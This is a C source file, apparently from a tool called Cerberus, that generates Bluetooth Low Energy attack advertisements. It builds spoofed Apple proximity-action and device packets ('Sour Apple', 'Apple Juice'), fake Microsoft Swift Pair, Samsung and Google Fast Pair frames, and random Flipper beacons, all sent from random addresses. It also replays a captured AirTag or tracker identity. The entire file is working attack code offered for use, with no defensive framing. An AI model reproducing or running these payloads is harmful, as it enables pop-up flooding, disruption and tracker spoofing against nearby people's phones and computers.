#include "ble_attack_payload.h"

#include <stddef.h>
#include <string.h>

static uint32_t next_random(cerberus_ble_attack_plan_t *plan)
{
    uint32_t value = plan->rng;
    value ^= value << 13U;
    value ^= value >> 17U;
    value ^= value << 5U;
    plan->rng = value;
    return value;
}

static uint8_t random_byte(cerberus_ble_attack_plan_t *plan)
{
    return (uint8_t)next_random(plan);
}

static void random_static_address(cerberus_ble_attack_plan_t *plan,
    cerberus_ble_attack_frame_t *frame)
{
    for (size_t i = 0; i < 6U; ++i) frame->address[i] = random_byte(plan);
    frame->address[5] = (uint8_t)((frame->address[5] & 0x3FU) | 0xC0U);
    frame->address_type = 1U;
}

static bool add_field(cerberus_ble_attack_frame_t *frame, uint8_t type,
    const uint8_t *value, size_t size)
{
    if (!value || size > 29U || (size_t)frame->length + size + 2U > sizeof(frame->data))
        return false;
    size_t at = frame->length;
    frame->data[at++] = (uint8_t)(size + 1U);
    frame->data[at++] = type;
    memcpy(frame->data + at, value, size);
    frame->length = (uint8_t)(at + size);
    return true;
}

bool cerberus_ble_attack_ad_valid(const uint8_t *data, uint8_t length)
{
    if (!data || !length || length > CERBERUS_BLE_ATTACK_AD_MAX) return false;
    size_t offset = 0U;
    bool any = false;
    while (offset < length) {
        uint8_t field = data[offset++];
        if (!field) {
            for (; offset < length; ++offset) if (data[offset]) return false;
            return any;
        }
        if (field > (size_t)length - offset) return false;
        any = true;
        offset += field;
    }
    return any;
}

static bool apple(cerberus_ble_attack_plan_t *plan,
    cerberus_ble_attack_frame_t *frame)
{
    static const uint8_t actions[] = {0x27U, 0x09U, 0x02U, 0x1EU, 0x2BU,
        0x2FU, 0x01U, 0x06U, 0x20U};
    static const uint16_t models[] = {0x0220U, 0x0F20U, 0x1320U, 0x1420U,
        0x0E20U, 0x0A20U, 0x0055U, 0x0C20U, 0x1120U, 0x0520U,
        0x1020U, 0x0920U, 0x1720U, 0x1220U, 0x1620U};
    if (next_random(plan) % 10U != 0U) {
        uint8_t value[9] = {0x4CU, 0x00U, 0x0FU, 0x05U, 0xC0U};
        value[5] = actions[next_random(plan) % (sizeof(actions) / sizeof(actions[0]))];
        for (size_t i = 6U; i < sizeof(value); ++i) value[i] = random_byte(plan);
        frame->kind = CERBERUS_BLE_PAYLOAD_APPLE_ACTION;
        return add_field(frame, 0xFFU, value, sizeof(value));
    }
    uint8_t value[19] = {0x4CU, 0x00U, 0x07U, 0x0FU, 0x00U};
    uint16_t model = models[next_random(plan) % (sizeof(models) / sizeof(models[0]))];
    value[5] = (uint8_t)(model >> 8U);
    value[6] = (uint8_t)model;
    const uint8_t marker[6] = {0xACU, 0x90U, 0x85U, 0x75U, 0x94U, 0x65U};
    memcpy(value + 7U, marker, sizeof(marker));
    for (size_t i = 13U; i < 18U; ++i) value[i] = random_byte(plan);
    frame->kind = CERBERUS_BLE_PAYLOAD_APPLE_DEVICE;
    return add_field(frame, 0xFFU, value, sizeof(value));
}

static bool swift_pair(cerberus_ble_attack_plan_t *plan,
    cerberus_ble_attack_frame_t *frame)
{
    static const char alphabet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    uint8_t value[15] = {0x06U, 0x00U, 0x03U, 0x00U, 0x80U};
    size_t name_length = 1U + next_random(plan) % 10U;
    for (size_t i = 0U; i < name_length; ++i)
        value[5U + i] = (uint8_t)alphabet[next_random(plan) % (sizeof(alphabet) - 1U)];
    frame->kind = CERBERUS_BLE_PAYLOAD_SWIFT_PAIR;
    return add_field(frame, 0xFFU, value, 5U + name_length);
}

static bool samsung(cerberus_ble_attack_plan_t *plan,
    cerberus_ble_attack_frame_t *frame)
{
    static const uint8_t models[] = {0x1AU,0x02U,0x03U,0x06U,0x07U,0x08U,
        0x09U,0x0BU,0x0CU,0x11U,0x12U,0x14U,0x16U,0x17U,0x1CU,0x1DU,0x20U};
    uint8_t value[13] = {0x75U,0x00U,0x01U,0x00U,0x02U,0x00U,0x01U,
        0x01U,0xFFU,0x00U,0x00U,0x43U,0};
    value[12] = models[next_random(plan) % (sizeof(models) / sizeof(models[0]))];
    frame->kind = CERBERUS_BLE_PAYLOAD_SAMSUNG;
    return add_field(frame, 0xFFU, value, sizeof(value));
}

static bool google(cerberus_ble_attack_plan_t *plan,
    cerberus_ble_attack_frame_t *frame)
{
    const uint8_t uuid[2] = {0x2CU,0xFEU};
    const uint8_t model[5] = {0x2CU,0xFEU,0x00U,0xB7U,0x27U};
    uint8_t power = (uint8_t)(int8_t)((int)(next_random(plan) % 120U) - 100);
    frame->kind = CERBERUS_BLE_PAYLOAD_GOOGLE;
    return add_field(frame, 0x03U, uuid, sizeof(uuid)) &&
        add_field(frame, 0x16U, model, sizeof(model)) &&
        add_field(frame, 0x0AU, &power, sizeof(power));
}

static bool flipper(cerberus_ble_attack_plan_t *plan,
    cerberus_ble_attack_frame_t *frame)
{
    uint8_t flags = 0x06U;
    uint8_t name[5];
    name[0] = (uint8_t)('A' + next_random(plan) % 26U);
    for (size_t i = 1U; i < sizeof(name); ++i)
        name[i] = (uint8_t)('a' + next_random(plan) % 26U);
    uint8_t uuid[2] = {(uint8_t)(0x81U + next_random(plan) % 3U),0x30U};
    uint8_t power = 0U;
    const uint8_t maker[8] = {0xBAU,0x0FU,0x4CU,0x75U,0x67U,0x26U,0xE1U,0x80U};
    frame->kind = CERBERUS_BLE_PAYLOAD_FLIPPER;
    /* The upstream byte stream declares this manufacturer field as length 5
     * while appending eight value bytes. Use the complete well-formed field. */
    return add_field(frame, 0x01U, &flags, sizeof(flags)) &&
        add_field(frame, 0x09U, name, sizeof(name)) &&
        add_field(frame, 0x02U, uuid, sizeof(uuid)) &&
        add_field(frame, 0x0AU, &power, sizeof(power)) &&
        add_field(frame, 0xFFU, maker, sizeof(maker));
}

cerberus_ble_attack_result_t cerberus_ble_attack_plan_init(
    cerberus_ble_attack_plan_t *plan, cerberus_ble_attack_mode_t mode,
    uint32_t seed, const cerberus_ble_attack_capture_t *capture)
{
    if (!plan) return CERBERUS_BLE_ATTACK_INVALID;
    memset(plan, 0, sizeof(*plan));
    if (mode < CERBERUS_BLE_ATTACK_SOUR_APPLE ||
        mode > CERBERUS_BLE_ATTACK_FIND_MY_SOUND) return CERBERUS_BLE_ATTACK_INVALID;
    plan->mode = mode;
    plan->rng = seed ? seed : 0x9E3779B9U;
    if (mode == CERBERUS_BLE_ATTACK_FIND_MY_SOUND)
        return CERBERUS_BLE_ATTACK_NEEDS_GATT;
    if (mode == CERBERUS_BLE_ATTACK_SPOOF_AIRTAG) {
        if (!capture || capture->address_type > 3U ||
            !cerberus_ble_attack_ad_valid(capture->data, capture->length))
            return CERBERUS_BLE_ATTACK_NEEDS_CAPTURE;
        plan->capture = *capture;
    }
    return CERBERUS_BLE_ATTACK_OK;
}

cerberus_ble_attack_result_t cerberus_ble_attack_next(
    cerberus_ble_attack_plan_t *plan, uint32_t now_ms,
    cerberus_ble_attack_frame_t *frame)
{
    if (!plan || !frame) return CERBERUS_BLE_ATTACK_INVALID;
    memset(frame, 0, sizeof(*frame));
    cerberus_ble_attack_mode_t mode = plan->mode;
    if (mode == CERBERUS_BLE_ATTACK_ALL) {
        static const cerberus_ble_attack_mode_t order[] = {
            CERBERUS_BLE_ATTACK_GOOGLE, CERBERUS_BLE_ATTACK_SAMSUNG,
            CERBERUS_BLE_ATTACK_SWIFT_PAIR, CERBERUS_BLE_ATTACK_SOUR_APPLE,
            CERBERUS_BLE_ATTACK_APPLE_JUICE, CERBERUS_BLE_ATTACK_FLIPPER};
        mode = order[plan->sequence % (sizeof(order) / sizeof(order[0]))];
    }
    if (mode == CERBERUS_BLE_ATTACK_FIND_MY_SOUND)
        return CERBERUS_BLE_ATTACK_NEEDS_GATT;
    if (mode == CERBERUS_BLE_ATTACK_SPOOF_AIRTAG) {
        if (!plan->capture.length ||
            !cerberus_ble_attack_ad_valid(plan->capture.data, plan->capture.length))
            return CERBERUS_BLE_ATTACK_NEEDS_CAPTURE;
        frame->kind = CERBERUS_BLE_PAYLOAD_CAPTURED_TRACKER;
        frame->length = plan->capture.length;
        memcpy(frame->data, plan->capture.data, frame->length);
        memcpy(frame->address, plan->capture.address, sizeof(frame->address));
        frame->address_type = plan->capture.address_type;
        frame->captured_identity = true;
        frame->active_ms = 10U;
        ++plan->sequence;
        return CERBERUS_BLE_ATTACK_OK;
    }
    if (mode == CERBERUS_BLE_ATTACK_SOUR_APPLE && plan->apple_cached &&
        (uint32_t)(now_ms - plan->apple_refreshed_ms) < 1000U) {
        *frame = plan->apple_cache;
        ++plan->sequence;
        return CERBERUS_BLE_ATTACK_OK;
    }
    random_static_address(plan, frame);
    bool valid = false;
    switch (mode) {
    case CERBERUS_BLE_ATTACK_SOUR_APPLE:
    case CERBERUS_BLE_ATTACK_APPLE_JUICE:
        valid = apple(plan, frame);
        frame->active_ms = mode == CERBERUS_BLE_ATTACK_APPLE_JUICE ? 500U : 60U;
        if (mode == CERBERUS_BLE_ATTACK_APPLE_JUICE) {
            frame->interval_units = 0x20U;
            frame->connectable = (next_random(plan) & 1U) != 0U;
        } else {
            plan->apple_cache = *frame;
            plan->apple_refreshed_ms = now_ms;
            plan->apple_cached = true;
        }
        break;
    case CERBERUS_BLE_ATTACK_SWIFT_PAIR:
        valid = swift_pair(plan, frame); frame->active_ms = 10U; break;
    case CERBERUS_BLE_ATTACK_SAMSUNG:
        valid = samsung(plan, frame); frame->active_ms = 10U; break;
    case CERBERUS_BLE_ATTACK_GOOGLE:
        valid = google(plan, frame); frame->active_ms = 10U; break;
    case CERBERUS_BLE_ATTACK_FLIPPER:
        valid = flipper(plan, frame); frame->active_ms = 10U; break;
    default: return CERBERUS_BLE_ATTACK_INVALID;
    }
    if (!valid || !cerberus_ble_attack_ad_valid(frame->data, frame->length)) {
        memset(frame, 0, sizeof(*frame));
        return CERBERUS_BLE_ATTACK_INVALID;
    }
    ++plan->sequence;
    return CERBERUS_BLE_ATTACK_OK;
}
